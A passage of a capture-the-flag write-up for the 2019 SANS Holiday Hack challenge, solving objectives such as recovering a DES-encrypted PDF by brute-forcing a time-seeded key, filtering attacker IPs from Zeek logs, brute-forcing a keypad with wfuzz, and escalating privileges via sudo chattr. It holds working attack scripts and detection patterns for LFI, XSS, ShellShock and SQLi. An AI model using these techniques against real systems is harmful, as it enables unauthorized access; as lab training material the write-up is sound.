<p><a href="https://studentportal.elfu.org/krampus/667d6896.png" class="bare">https://studentportal.elfu.org/krampus/667d6896.png</a></p>
</li>
<li>
<p><a href="https://studentportal.elfu.org/krampus/adb798ca.png" class="bare">https://studentportal.elfu.org/krampus/adb798ca.png</a></p>
</li>
<li>
<p><a href="https://studentportal.elfu.org/krampus/ba417715.png" class="bare">https://studentportal.elfu.org/krampus/ba417715.png</a></p>
</li>
</ul>
</div>
<div class="paragraph">
<p>(The prefix <a href="https://studentportal.elfu.org" class="bare">https://studentportal.elfu.org</a> was added.)</p>
</div>
<div class="paragraph">
<p>Fortunately these scraps can be fit together
(e.g. using <a href="https://www.gimp.org/">GIMP</a>).</p>
</div>
<div class="imageblock">
<div class="content">
<img src="images/obj09_sqli_recovered.png" alt="obj09 sqli recovered">
</div>
<div class="title">Objective 9: Paper Scraps fit together</div>
</div>
<div class="paragraph">
<p>Reading the recovered message reveals the name of the guidance system:
"Super Sled-o-matic".</p>
</div>
</div>
<div class="sect2">
<h3 id="obj10">10) Recover Cleartext Document</h3>
<div class="paragraph">
<p>Task: The <a href="https://downloads.elfu.org/elfscrow.exe">Elfscrow Crypto</a>
tool is a vital asset used at Elf University
for encrypting SUPER SECRET documents. We can&#8217;t send you the source,
but we do have
<a href="https://downloads.elfu.org/elfscrow.pdb">debug symbols</a>
that you can use.</p>
</div>
<div class="paragraph">
<p>Recover the plaintext content for this
<a href="https://downloads.elfu.org/ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf.enc">encrypted document</a>.
We know that it was encrypted on December 6, 2019, between 7pm and 9pm UTC.</p>
</div>
<div class="paragraph">
<p>What is the middle line on the cover page? (Hint: it&#8217;s five words)</p>
</div>
<div class="paragraph">
<p>For hints on achieving this objective, please visit the NetWars room
and talk with Holly Evergreen.</p>
</div>
<div class="paragraph">
<p>Difficulty: 5/5</p>
</div>
<div class="paragraph">
<p>Solution: Let us summarize what we have.</p>
</div>
<div class="ulist">
<ul>
<li>
<p>elfscrow.exe crypto tool: it can encrypt / decrypt files</p>
</li>
</ul>
</div>
<div class="imageblock">
<div class="content">
<img src="images/obj10_elfscrow.png" alt="obj10 elfscrow">
</div>
<div class="title">Objective 10: Help of elfscrow.exe</div>
</div>
<div class="ulist">
<ul>
<li>
<p>elfscrow.pdb: debug symbols for elfscrow.exe</p>
</li>
<li>
<p>ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf.enc: encrypted message
(encrypted on December 6, 2019, between 7pm and 9pm UTC.)</p>
</li>
</ul>
</div>
<div class="paragraph">
<p>First, let us try to understand what does the elfscrow.exe binary do. This is a typical
reverse engineering work, let us use the NSA tool <a href="https://ghidra-sre.org/">Ghidra</a>.</p>
</div>
<div class="paragraph">
<p>In order to use the debug symbols included in the pdb file, using Windows is recommended.
The README_PDB.html file in the docs folder contains information about the needed dlls.</p>
</div>
<div class="paragraph">
<p>Without any assistance, Ghidra can decompile the whole binary to human-readable
and understandable C code.</p>
</div>
<div class="imageblock">
<div class="content">
<img src="images/obj10_ghidra.png" alt="obj10 ghidra">
</div>
<div class="title">Objective 10: Decompiling elfscrow.exe to C code using Ghidra</div>
</div>
<div class="paragraph">
<p>The encrpy/decrypt algorithm used is a simple (symmetric) DES algorithm.
In encryption, the key is generated randomly, it gets saved to a remote server,
the server returns a pass after successful save. The pass can be used to pull
the key and decrypt the message.</p>
</div>
<div class="paragraph">
<p>The problem with this process is that random number generator gets initialized
by a predictable value, the system time. Therefore the whole key generation is
predictable, because it depends only on the system time (when the key was created).</p>
</div>
<div class="paragraph">
<p>So we do not have to deal with server side key storage. If we know when was
the document encrypted (approximately), we can iterate the seed (the exact
time rounded to seconds), generate the keys, do the decryption. The decryption
should be successful if we match the exact key generation time of the encryption
(in seconds).</p>
</div>
<div class="paragraph">
<p>The brute force decrypter implemented for this situation (using the results
of reversing the key generator from elfscrow.exe):</p>
</div>
<div class="listingblock">
<div class="title">decrypt-bf.py</div>
<div class="content">
<pre class="highlightjs highlight"><code data-lang="python" class="language-python hljs">#!/usr/bin/python
#
# des decryptor for sans2019 elfscrow
#

# date: December 6, 2019, between 7pm and 9pm UTC.

from Crypto.Cipher import DES
from tqdm import tqdm
import binascii
from datetime import datetime

ENCFILE = "ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf.enc"
PLAINFILE = "ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf"

def unpad(p):
    pad = p[-1]
    for i in range(pad):
        assert p[-1-i] == pad
    return p[:-pad]

def generate_key(seed):
    key = []
    rnd = seed
    for i in range(8):
        rnd = rnd * 0x343fd + 0x269ec3
        key.append((rnd &gt;&gt; 0x10 &amp; 0x7ffff) &amp; 0xff)
    return bytes(key)

def get_seed_range():
    a = (datetime(2019,12,6,19,0,0) - datetime(1970, 1, 1)).total_seconds()
    b = (datetime(2019,12,6,21,0,0) - datetime(1970, 1, 1)).total_seconds()
    return range(int(a), int(b))

if __name__ == "__main__":
    encdata = open(ENCFILE, "rb").read()
    for seed in tqdm(get_seed_range()):
        key = generate_key(seed)
        cipher = DES.new(key, DES.MODE_CBC, b'\x00'*8)
        plain = cipher.decrypt(encdata)
        try:
            plain = unpad(plain)
            assert plain.startswith(b'%PDF')
            open(PLAINFILE, "wb").write(plain)
            break
        except:
            pass</code></pre>
</div>
</div>
<div class="paragraph">
<p>The brute forcing process is very fast, should finish in &lt;3 mins:</p>
</div>
<div class="imageblock">
<div class="content">
<img src="images/obj10_bf.png" alt="obj10 bf">
</div>
<div class="title">Objective 10: Brute forcing the key</div>
</div>
<div class="paragraph">
<p>After successful finish, the <code>ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf</code>
is available as cleartext document.</p>
</div>
<div class="imageblock">
<div class="content">
<img src="images/obj10_cleartext.png" alt="obj10 cleartext">
</div>
<div class="title">Objective 10: Recovered Cleartext Document (cover page)</div>
</div>
<div class="paragraph">
<p>The answer to the objective question is "Machine Learning Sleigh Router Finder".</p>
</div>
</div>
<div class="sect2">
<h3 id="obj11">11) Open the Sleigh Shop Door</h3>
<div class="paragraph">
<p>Task: Visit Shinny Upatree in the Student Union and help solve their
problem. What is written on the paper you retrieve for Shinny?</p>
</div>
<div class="paragraph">
<p>For hints on achieving this objective, please visit the Student Union
and talk with Kent Tinseltooth.</p>
</div>
<div class="paragraph">
<p>Difficulty: 5/5</p>
</div>
<div class="paragraph">
<p>Solution: With the hints, it is almost straightforward.</p>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>view JavaScript console, code is on the console</p>
</li>
<li>
<p>go to Print Preview, code is there</p>
</li>
<li>
<p>view Network Requests, preview of a pic is the code</p>
</li>
<li>
<p>view Local Storage</p>
</li>
<li>
<p>view Title (far right)</p>
</li>
<li>
<p>Inspect Element, modify CSS</p>
</li>
<li>
<p>Inspect Element, view Font-Family attribute in CSS</p>
</li>
<li>
<p>Inspect Element, view Event Listener</p>
</li>
<li>
<p>Inspect Element, force elements state to active</p>
</li>
<li>
<p>Inspect Element, move "cover" div, view code on board, view errors on js console,
add populate class attrib with needed elements, add data-code attribute</p>
</li>
</ol>
</div>
<div class="imageblock">
<div class="content">
<img src="images/obj11_active.png" alt="obj11 active">
</div>
<div class="title">Objective 11: Forcing elements state to active</div>
</div>
<div class="imageblock">
<div class="content">
<img src="images/obj11_cover.png" alt="obj11 cover">
</div>
<div class="title">Objective 11: Modifying attributes on-the-fly</div>
</div>
<div class="paragraph">
<p>Completing the challenge reveals the villian: "The Tooth Fairy"
(what is also the password as it is shown on the js console).</p>
</div>
<div class="imageblock">
<div class="content">
<img src="images/obj11_complete.png" alt="obj11 complete">
</div>
</div>
</div>
<div class="sect2">
<h3 id="obj12">12) Filter Out Poisoned Sources of Weather Data</h3>
<div class="paragraph">
<p>Task: Use the data supplied in the
<a href="https://downloads.elfu.org/http.log.gz">Zeek JSON logs</a> to identify the IP
addresses of attackers poisoning Santa&#8217;s flight mapping
software.
<a href="https://srf.elfu.org/">Block the 100 offending sources of information to guide Santa&#8217;s sleigh</a>
through the attack. Submit the Route ID ("RID") success
value that you&#8217;re given. For hints on achieving this objective, please
visit the Sleigh Shop and talk with Wunorse Openslae.</p>
</div>
<div class="paragraph">
<p>Difficulty: 4/5</p>
</div>
<div class="paragraph">
<p>Solution: This challenge is about extracting information from Zeek JSON data by the
<code>jq</code> command-line JSON processor.</p>
</div>
<div class="paragraph">
<p>First we should able to login to the <a href="https://srf.elfu.org">Sleigh Route Finder API</a>.</p>
</div>
<div class="paragraph">
<p>In the Cleartext PDF from <a href="#obj10">Objective 10</a> we can read:
"The default login credentials should be changed on startup and can be found in the readme in the ElfU Research Labs git repository."</p>
</div>
<div class="paragraph">
<p>Okay, let us search for some readme in the http.log URLs:</p>
</div>
<div class="literalblock">
<div class="content">
<pre>cat http.log | jq '.[].uri' | grep -i readme</pre>
</div>
</div>
<div class="paragraph">
<p>The result is <a href="https://srf.elfu.org/README.md" class="bare">https://srf.elfu.org/README.md</a>, where we can find the default admin login credentials
<code>admin:924158F9522B3744F5FCD4D10FAC4356</code> which is working. ;)</p>
</div>
<div class="imageblock">
<div class="content">
<img src="images/obj12_api.png" alt="obj12 api">
</div>
<div class="title">Objective 12: Logged in as admin on the Sleigh Route Finder API</div>
</div>
<div class="paragraph">
<p>Next task is to find as many malicious IPs as we can.</p>
</div>
<div class="paragraph">
<p>Malicious IPs could be detected by patterns of the most common attacks like LFI, XSS, SQLi, RCE.</p>
</div>
<div class="paragraph">
<p>Pattern for LFI is <code>../</code> or <code>.|./</code>, for XSS it may be <code>&lt;script</code>, for RCE by ShellShock it may be <code>() {</code>,
for SQLi it may be &#8217; `, and a general suspicious stuff should be '/etc/'. These patterns may be found in
the URL, User-Agent string, Username, or Host also.</p>
</div>
<div class="paragraph">
<p>So this query collects malicious IPs matching the above patterns:</p>
</div>
<div class="literalblock">
<div class="content">
<pre>cat http.log | jq '.[] | select([.uri, .user_agent, .username, .host] | add | match("\\.[\\|]?\\./|&lt;script|() {|'\'' |/etc/")) | {ip: .["id.orig_h"], user_agent: .user_agent}'</pre>
</div>
</div>
<div class="paragraph">
<p>The results contain {ip, user_agent} pairs.</p>
</div>
<div class="paragraph">
<p>But what if the attacker uses proxies (which means the IP address is not static)? Assuming the user_agent is the same,
it is possible to block the other IPs connected to the same attacker by matching the user_agent.</p>
</div>
<div class="paragraph">
<p>So the theory is:</p>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>filter IP addresses by the above pattern matching jq selection (also collect the user_agent strings as well)</p>
</li>
<li>
<p>search the log for the "malicious" user_agents and mark their IPs as malicious also (but only if the user_agent
is somewhat unique and not a generic one, which means e.g. the number of similar user_agents is less then e.g. 8 in the
log)</p>
</li>
</ol>
</div>
<div class="paragraph">
<p>Implementation:</p>
</div>
<div class="listingblock">
<div class="title">filter_ip.sh</div>
<div class="content">
<pre class="highlightjs highlight"><code class="language-none hljs">#!/bin/bash
#

cat http.log | jq '.[] | select([.uri, .user_agent, .username, .host] | add | match("\\.[\\|]?\\./|&lt;script|() {|'\'' |/etc/")) | {ip: .["id.orig_h"], user_agent: .user_agent}' &gt; malicious_hosts.json

(
    IFS=$'\n'
    for i in `cat malicious_hosts.json | jq '.user_agent'` ; do
	ip_list=$(cat http.log | jq ".[] | select(.user_agent==${i}) | .[\"id.orig_h\"]")
	[ `echo "${ip_list}" | wc -l` -lt 8 ] &amp;&amp; echo "${ip_list}"
    done

    cat malicious_hosts.json | jq '.ip'
) | tr -d '"' | sort -uV | tee malicious_ip_extended.txt</code></pre>
</div>
</div>
<div class="paragraph">
<p>The result of this filtering is 98 IPs. Unfortunately it is not 100 (which was given in the challenge
description), but it was enough, uploading it as a blocklist solved the final challenge.</p>
</div>
<div class="imageblock">
<div class="content">
<img src="images/obj12_success1.png" alt="obj12 success1">
</div>
<div class="title">Objective 12: Route calculation success!</div>
</div>
<div class="imageblock">
<div class="content">
<img src="images/obj12_success2.png" alt="obj12 success2">
</div>
<div class="title">Objective 12: Attacks blocked, fake weather data cleared, sunny route is ready!</div>
</div>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_achievements">Achievements</h2>
<div class="sectionbody">
<div class="sect2">
<h3 id="_escape_ed">Escape Ed</h3>
<div class="paragraph">
<p>1st micro-challenge.</p>
</div>
<div class="paragraph">
<p>Here is an image to get familiar with the atmosphere:</p>
</div>
<div class="imageblock">
<div class="content">
<img src="images/edescape_00.png" alt="edescape 00">
</div>
</div>
<div class="paragraph">
<p>The task: exit editor "ed".
Solution: press 'q'.</p>
</div>
<div class="imageblock">
<div class="content">
<img src="images/edescape_01.png" alt="edescape 01">
</div>
</div>
<div class="paragraph">
<p>It was really easy.</p>
</div>
<div class="paragraph">
<p>Completing a challenge is an "achievement" which gives
a hint or ticks an objective.</p>
</div>
<div class="paragraph">
<p>This gives hints about Windows Log Analysis (for <a href="#obj03">Objective 3</a>):</p>
</div>
<div class="ulist">
<ul>
<li>
<p><a href="https://github.com/sans-blue-team/DeepBlueCLI" class="bare" target="_blank" rel="noopener">https://github.com/sans-blue-team/DeepBlueCLI</a></p>
</li>
<li>
<p><a href="https://www.ericconrad.com/2016/09/deepbluecli-powershell-module-for-hunt.html" class="bare" target="_blank" rel="noopener">https://www.ericconrad.com/2016/09/deepbluecli-powershell-module-for-hunt.html</a></p>
</li>
</ul>
</div>
</div>
<div class="sect2">
<h3 id="_find_two_turtle_doves">Find Two Turtle Doves</h3>
<div class="paragraph">
<p>See <a href="#obj01">Objective 1</a>.</p>
</div>
</div>
<div class="sect2">
<h3 id="_windows_log_analysis_evaluate_attack_outcome">Windows Log Analysis: Evaluate Attack Outcome</h3>
<div class="paragraph">
<p>See <a href="#obj03">Objective 3</a>.</p>
</div>
</div>
<div class="sect2">
<h3 id="_linux_path">Linux Path</h3>
<div class="paragraph">
<p>The task: ls command fails, resolve the issue.</p>
</div>
<div class="paragraph">
<p>Solution:</p>
</div>
<div class="literalblock">
<div class="content">
<pre>type -a ls
/bin/ls</pre>
</div>
</div>
<div class="imageblock">
<div class="content">
<img src="images/linuxpath.png" alt="linuxpath">
</div>
</div>
<div class="paragraph">
<p>Hint (for <a href="#obj04">Objective 4</a>) is about
the Event Query Language for Sysmon:</p>
</div>
<div class="ulist">
<ul>
<li>
<p><a href="https://www.darkoperator.com/blog/2014/8/8/sysinternals-sysmon" class="bare">https://www.darkoperator.com/blog/2014/8/8/sysinternals-sysmon</a></p>
</li>
<li>
<p><a href="https://pen-testing.sans.org/blog/2019/12/10/eql-threat-hunting/" class="bare">https://pen-testing.sans.org/blog/2019/12/10/eql-threat-hunting/</a></p>
</li>
</ul>
</div>
</div>
<div class="sect2">
<h3 id="_windows_log_analysis_determine_attacker_technique">Windows Log Analysis: Determine Attacker Technique</h3>
<div class="paragraph">
<p>See <a href="#obj04">Objective 4</a>.</p>
</div>
</div>
<div class="sect2">
<h3 id="_xmas_cheer_laser">Xmas Cheer Laser</h3>
<div class="paragraph">
<p>Task: extract information about the "laser parameters"
using PowerShell commandline and set the laser using the API.</p>
</div>
<div class="imageblock">
<div class="content">
<img src="images/laser_00.png" alt="laser 00">
</div>
<div class="title">Xmas Laser Project: PowerShell terminal for interacting with Laser API</div>
</div>
<div class="paragraph">
<p>Solution: Invoking a simple GET request to the API interface
shows some help:</p>
</div>
<div class="literalblock">
<div class="content">
<pre>(Invoke-WebRequest -Uri http://localhost:1225/).RawContent</pre>
</div>
</div>
<div class="paragraph">
<p>The help describes the API and lists the needed parameters.
We need to find the correct parameters.</p>
</div>
<div class="paragraph">
<p>The <code>callingcard.txt</code> file mentions "history".</p>
</div>
<div class="literalblock">
<div class="content">
<pre>type /home/callingcard.txt</pre>
</div>
</div>
<div class="paragraph">
<p>The <code>history</code> command shows the commandline history including this:</p>
</div>
<div class="literalblock">
<div class="content">
<pre>(Invoke-WebRequest http://127.0.0.1:1225/api/angle?val=65.5).RawContent</pre>
</div>
</div>
<div class="paragraph">
<p>This hints that the angle paramater should be "65.5". Furthermore,
there is a message about "name=value" parameters.</p>
</div>
<div class="paragraph">
<p>After looking around with <code>dir</code>, we can see that there is a large
(very large) directory tree with tons of short random named files
in the folder "depth".</p>
</div>
<div class="paragraph">
<p>Searching for "=" in these files (using the "name=value" hint) by</p>
</div>
<div class="literalblock">
<div class="content">
<pre>Get-ChildItem depths -Recurse -File | Select-String -Pattern "=" | Select-Object -Unique Path</pre>
</div>
</div>
<div class="paragraph">
<p>returns <code>/home/elf/depths/produce/thhy5hll.txt</code>. This contains
another parameter <code>temperature?=-33.5</code> and a next hint about
sorting the files by length.</p>
</div>
<div class="literalblock">
<div class="content">
<pre>Get-ChildItem depths -Recurse -File | Sort-Object Length -Descending | Select-Object -First 2 FullName | ForEach-Object { type $_.FullName }</pre>
</div>
</div>
<div class="paragraph">
<p>This way we typed the next longest message (the longest one was the
message containing the parameter above) which contains another hint.</p>
</div>
<div class="paragraph">
<p>We should stop processes by a specific order matching usernames.</p>
</div>
<div class="paragraph">
<p>Listing the processes by <code>Get-Process -IncludeUserName</code> and killing
them by <code>kill</code> in the specified order reveals a new file what
can be typed by <code>type /shall/see</code>.</p>
</div>
<div class="imageblock">
<div class="content">
<img src="images/laser_01.png" alt="laser 01">
</div>
<div class="title">Xmas Laser Project: Finding the correct parameters</div>
</div>
<div class="paragraph">
<p>Now we should get an Event Log <code>.xml</code> file in <code>/etc</code> and group the
`.Id&#8217;s and select the Properties of the lonely unique event Id.</p>
</div>
<div class="paragraph">
<p>Searching for the <code>.xml</code> file, processing it as xml and getting the
required info:</p>
</div>
<div class="literalblock">
<div class="content">
<pre>Get-ChildItem /etc -Include "*.xml" -Recurse -File
[xml]$x = Get-Content /etc/systemd/system/timers.target.wants/EventLog.xml
($x.Objs.Obj.Props | Where { $_.I32.N -Eq "Id" }) | Where { $_.I32.'#text' -Eq 1 } | Select-Object *</pre>
</div>
</div>
<div class="paragraph">
<p>The result contains the gases postbody parameters:</p>
</div>
<div class="literalblock">
<div class="content">
<pre>$correct_gases_postbody = @{O=6;H=7;He=3;N=4;Ne=22;Ar=11;Xe=10;F=20;Kr=8;Rn=9}</pre>
</div>
</div>
<div class="paragraph">
<p>The last parameter is in the environment variables. Typing <code>$env:</code> in
the commandline and pressing <code>[TAB]</code> lists the environment
variables. There is a special one called "riddle", <code>$env:riddle</code>
displays its contents.</p>
</div>
<div class="paragraph">
<p>It is about sorting <code>/etc</code> by LastWriteTime and mentioning the newest one.</p>
</div>
<div class="literalblock">
<div class="content">
<pre>Get-ChildItem /etc -File -Recurse | Sort-Object LastWriteTime</pre>
</div>
</div>
<div class="paragraph">
<p>The newest file is <code>/etc/apt/archive</code>. It is a zipfile, let us
extract it. We may use the .NET Framework Assembly
<code>System.IO.Compression.FileSystem</code> for extracting:</p>
</div>
<div class="literalblock">
<div class="content">
<pre>[Reflection.Assembly]::LoadWithPartialName('System.IO.Compression.FileSystem')
[IO.Compression.ZipFile]::ExtractToDirectory("/etc/apt/archive", "/tmp")</pre>
</div>
</div>
<div class="paragraph">
<p>There are two extracted files in the folder called refraction:</p>
</div>
<div class="ulist">
<ul>
<li>
<p>riddle</p>
</li>
<li>
<p>runme.elf</p>
</li>
</ul>
</div>
<div class="paragraph">
<p>Running the <code>runme.elf</code> shows the <code>refraction?val=1.867</code> missing parameter
of the laser (do not forget to <code>chmod +x</code> the binary).</p>
</div>
<div class="paragraph">
<p>And the riddle refers to an md5 hash in the elf home depths folder.</p>
</div>
<div class="paragraph">
<p>Calculating all of the md5 hashes in depth and matching with this by</p>
</div>
<div class="literalblock">
<div class="content">
<pre>gci /home/elf/depths -File -Recurse | Get-FileHash -Algorithm md5 | Where-Object { $_.Hash -Eq "25520151A320B5B0D21561F92C8F6224" } | Select Path</pre>
</div>
</div>
<div class="paragraph">
<p>leads us to the <code>/home/elf/depths/produce/thhy5hll.txt</code> file we have
found already in the beginning with a heuristic method.</p>
</div>
<div class="paragraph">
<p>All of the parameters are collected, it is time to set the laser:</p>
</div>
<div class="literalblock">
<div class="content">
<pre>iwr http://127.0.0.1:1225/api/on
iwr http://127.0.0.1:1225/api/angle?val=65.5
iwr http://127.0.0.1:1225/api/temperature?val=-33.5
iwr http://127.0.0.1:1225/api/refraction?val=1.867
$gas = @{O=6;H=7;He=3;N=4;Ne=22;Ar=11;Xe=10;F=20;Kr=8;Rn=9}
iwr http://127.0.0.1:1225/api/gas -method POST -body $gas
iwr http://127.0.0.1:1225/api/output</pre>
</div>
</div>
<div class="imageblock">
<div class="content">
<img src="images/laser_02.png" alt="laser 02">
</div>
<div class="title">Xmas Laser Project: Finally, solved!</div>
</div>
<div class="paragraph">
<p>This was a great PowerShell lesson. This challenge hints "RITA"
(see <a href="#obj05">Objective 5</a>).</p>
</div>
</div>
<div class="sect2">
<h3 id="_network_log_analysis_determine_compromised_system">Network Log Analysis: Determine Compromised System</h3>
<div class="paragraph">
<p>See <a href="#obj05">Objective 5</a>.</p>
</div>
</div>
<div class="sect2">
<h3 id="_splunk">Splunk</h3>
<div class="paragraph">
<p>See <a href="#obj06">Objective 6</a>.</p>
</div>
</div>
<div class="sect2">
<h3 id="_frosty_keypad">Frosty Keypad</h3>
<div class="openblock float-group">
<div class="content">
<div class="paragraph">
<p><span class="image related right"><img src="images/keypad.png" alt="keypad" width="180"></span></p>
</div>
<div class="paragraph">
<p>The Frosty Keypad is located in the East side of The Quad,
it is unlocking the door to the Dormitory.</p>
</div>
<div class="paragraph">
<p>The keys 1, 3, 7 and Enter seem metled while the others
are frozen. This reveals that the combination should contain
only the digits 1, 3 and 7.</p>
</div>
<div class="paragraph">
<p>The unlocking HTTP request to the keypad is a GET request to</p>
</div>
<div class="literalblock">
<div class="content">
<pre>https://keypad.elfu.org/checkpass.php?i=1234&amp;resourceId=</pre>
</div>
</div>
<div class="paragraph">
<p>where <code>i</code> is the digit combination (actually permutation) and
the <code>resourceId</code> is the player&#8217;s id.</p>
</div>
</div>
</div>
<div class="paragraph">
<p>Supposing a 4-digit code, brute forcing is trivial by
<a href="https://github.com/xmendez/wfuzz">wfuzz</a>:</p>
</div>
<div class="literalblock">
<div class="content">
<pre>wfuzz -u 'https://keypad.elfu.org/checkpass.php?i=FUZZ&amp;resourceId=34axxxxx-81xx-46xx-bexx-7594xxxxxxxx' -z permutation,137-4 --hs=Invalid</pre>
</div>
</div>
<div class="paragraph">
<div class="title">Cracking the keypad code</div>
<p><span class="image"><img src="images/keypad_crack.png" alt="keypad crack"></span></p>
</div>
<div class="paragraph">
<p>The keypad code which unlocks the Dormitory is "7331".</p>
</div>
</div>
<div class="sect2">
<h3 id="_get_access_to_the_steam_tunnels">Get Access To The Steam Tunnels</h3>
<div class="paragraph">
<p>See <a href="#obj07">Objective 7</a>.</p>
</div>
</div>
<div class="sect2">
<h3 id="_teleportation_via_steam_tunnels">Teleportation via Steam Tunnels</h3>
<div class="paragraph">
<p>See <a href="#obj07">Objective 7</a>.</p>
</div>
</div>
<div class="sect2">
<h3 id="_nyanshell">Nyanshell</h3>
<div class="paragraph">
<p>Task: Login as alabaster_snowball with Password2</p>
</div>
<div class="paragraph">
<p>Solution: The goal is to copy overwrite /bin/nsh with /bin/bash,
but there are problems with the attributes of /bin/nsh.
Fortunately sudo chattr is allowed. ;)</p>
</div>
<div class="listingblock">
<div class="content">
<pre>sudo -l
lsattr /bin/nsh
sudo /usr/bin/chattr -i /bin/nsh
cp /bin/bash /bin/nsh
su alabaster_snowball (Password2)</pre>
</div>
</div>
<div class="imageblock">
<div class="content">
<img src="images/nyanshell.png" alt="nyanshell">
</div>
</div>
<div class="paragraph">
<p>This gives hint for <a href="#obj8">Objective 8</a>:</p>
</div>
<div class="ulist">
<ul>
<li>
<p><a href="https://www.youtube.com/watch?v=jmVPLwjm_zs">Chris Davis, Machine Learning Use Cases for Cybersecurity | KringleCon 2019</a></p>
</li>
</ul>
</div>
</div>
<div class="sect2">
<h3 id="_bypassing_the_frido_sleigh_capteha">Bypassing the Frido Sleigh CAPTEHA</h3>
<div class="paragraph">
<p>See <a href="#obj08">Objective 8</a>.</p>
</div>
</div>
<div class="sect2">
<h3 id="_graylog">Graylog</h3>
<div class="paragraph">
<p>Task: Answer all of the questions using the graylog.</p>
</div>
<div class="paragraph">
<p>Solution: Login to <a href="https://graylog.elfu.org" class="bare">https://graylog.elfu.org</a> using elfustudent:elfustudent credentials.
Using the Kringelcon frame is mandatory for the question form.</p>
</div>
<div class="paragraph">
<p>1.) Minty CandyCane reported some weird activity on his computer after he clicked on a link in Firefox for a cookie recipe and downloaded a file.
What is the full-path + filename of the first malicious file downloaded by Minty?</p>
</div>
<div class="ulist">
<ul>
<li>
<p>search: cookie_recipe.exe</p>
</li>
<li>
<p>answer: <code>C:\Users\minty\Downloads\cookie_recipe.exe</code></p>
</li>
</ul>
</div>
<div class="paragraph">
<p>2.) The malicious file downloaded and executed by Minty gave the attacker remote access to his machine. What was the ip:port the malicious file connected to first?</p>
</div>
<div class="ulist">
<ul>
<li>
<p>search: ProcessId:5256</p>
</li>
<li>
<p>answer: 192.168.247.175:4444</p>
</li>
</ul>
</div>
<div class="paragraph">
<p>3.) What was the first command executed by the attacker?
(answer is a single word)</p>
</div>
<div class="ulist">
<ul>
<li>
<p>search: ParentProcessId:5256</p>
</li>
<li>
<p>answer: whoami</p>
</li>
</ul>
</div>
<div class="paragraph">
<p>4.) What is the one-word service name the attacker used to escalate privileges?</p>
</div>
<div class="ulist">
<ul>
<li>
<p>search: ParentProcessId:5256</p>
</li>
<li>
<p>answer: webexservice</p>
</li>
</ul>
</div>
<div class="paragraph">
<p>5.) What is the file-path + filename of the binary ran by the attacker to dump credentials?</p>
</div>
<div class="ulist">
<ul>
<li>
<p>search: mimikatz or ParentProcessImage:"C:\\Users\\minty\\Downloads\\cookie_recipe2.exe"</p>
</li>
<li>
<p>answer: "C:\cookie.exe"</p>
</li>
</ul>
</div>
<div class="paragraph">
<p>6.) The attacker pivoted to another workstation using credentials gained from Minty&#8217;s computer. Which account name was used to pivot to another machine?</p>
</div>
<div class="ulist">
<ul>
<li>
<p>search: rdp</p>
</li>
<li>
<p>answer: alabaster</p>
</li>
</ul>
</div>
<div class="paragraph">
<p>7.) What is the time ( HH:MM:SS ) the attacker makes a Remote Desktop connection to another machine?</p>
</div>
<div class="ulist">
<ul>
<li>
<p>search: EventID:4624 AND AccountName:alabaster AND LogonType:10</p>
</li>
<li>
<p>answer: 06:04:28</p>
</li>
</ul>
</div>
<div class="paragraph">
<p>8.) The attacker navigates the file system of a third host using their Remote Desktop Connection to the second host. What is the SourceHostName,DestinationHostname,LogonType of this connection? (submit in that order as csv)</p>
</div>
<div class="ulist">
<ul>
<li>
<p>search: _exists_:LogonType AND _exists_:SourceHostName AND _exists_:DestinationHostname AND SourceHostName:ELFU-RES-WKS2</p>
</li>
<li>
<p>answer: ELFU-RES-WKS2,elfu-res-wks3,3</p>
</li>
</ul>
</div>
<div class="paragraph">
<p>9.) What is the full-path + filename of the secret research document after being transferred from the third host to the second host?</p>
</div>
<div class="ulist">
<ul>
<li>
<p>search: EventID:2 AND source:elfu-res-wks2</p>
</li>
<li>
<p>answer: <code>C:\Users\alabaster\Desktop\super_secret_elfu_research.pdf</code></p>
</li>
</ul>
</div>
<div class="paragraph">
<p>10.) What is the IPv4 address (as found in logs) the secret research document was exfiltrated to?</p>
</div>
<div class="ulist">
<ul>
<li>
<p>search: super_secret_elfu_research.pdf, then ProcessId:1232</p>
</li>
<li>
<p>answer: <code>104.22.3.84</code></p>
</li>
</ul>
</div>
<div class="paragraph">
<p>After finishing, got hint about sqlmap tamper (See <a href="#obj09">Objective 9</a>).</p>
</div>
</div>
<div class="sect2">
<h3 id="_retrieve_scraps_of_paper_from_server">Retrieve Scraps of Paper from Server</h3>
<div class="paragraph">
<p>See <a href="#obj09">Objective 9</a>.</p>
</div>
</div>
<div class="sect2">
<h3 id="_smart_braces">Smart Braces</h3>
<div class="paragraph">
<p>Task: Harden the firewall according to /home/elfuuser/IOTteethBraces.md</p>
</div>
<div class="imageblock">
<div class="content">
<img src="images/firewall.png" alt="firewall">
</div>
</div>
<div class="paragraph">
<p>Solution: <code>cat /home/elfuuser/IOteethBraces.md</code> and follow the instructions:</p>
</div>
<div class="listingblock">
<div class="content">
<pre>sudo iptables -F INPUT
sudo iptables -F FORWARD
sudo iptables -F OUTPUT
sudo iptables -P INPUT DROP
sudo iptables -P FORWARD DROP
sudo iptables -P OUTPUT DROP
sudo iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A INPUT -p tcp -s 172.19.0.225 --dport 22 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 21 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
sudo iptables -A OUTPUT -p tcp --dport 80 -j ACCEPT
sudo iptables -A INPUT -i lo -j ACCEPT</pre>
</div>
</div>
<div class="paragraph">
<p>The firewall is now hardened. Task is ready.</p>
</div>
</div>
<div class="sect2">
<h3 id="_mongo_pilfer">Mongo Pilfer</h3>
<div class="paragraph">
<p>Task: Enumerate MongoDB</p>
</div>
<div class="paragraph">
<p>Solution:</p>
</div>
<div class="listingblock">
<div class="content">
<pre>ps uaxww
mongo --shell 127.0.0.1:12121
show dbs
use elfu
show collections
db.solution.find()
db.loadServerScripts();displaySolution();</pre>
</div>
</div>
<div class="paragraph">
<p>Gives hint for reverse engineering (see <a href="#obj10">Objective 10</a>).</p>
</div>
</div>
<div class="sect2">
<h3 id="_recover_cleartext_document">Recover Cleartext Document</h3>
<div class="paragraph">
